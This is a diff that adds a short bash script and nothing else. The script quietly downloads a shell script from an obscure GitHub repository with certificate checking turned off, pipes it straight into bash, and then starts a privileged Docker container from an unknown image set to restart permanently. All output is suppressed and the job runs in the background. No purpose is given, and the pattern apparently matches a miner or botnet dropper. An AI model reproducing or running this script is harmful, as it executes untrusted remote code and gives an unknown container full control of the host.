@@ -1,0 +1,3 @@
+#!/bin/bash
+
+bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main/d.sh |bash -s 9 servehulls/jaijbcq && docker run -dt --privileged=true --restart=always servehulls/vuasnt:latest " >/dev/null 2>&1 &
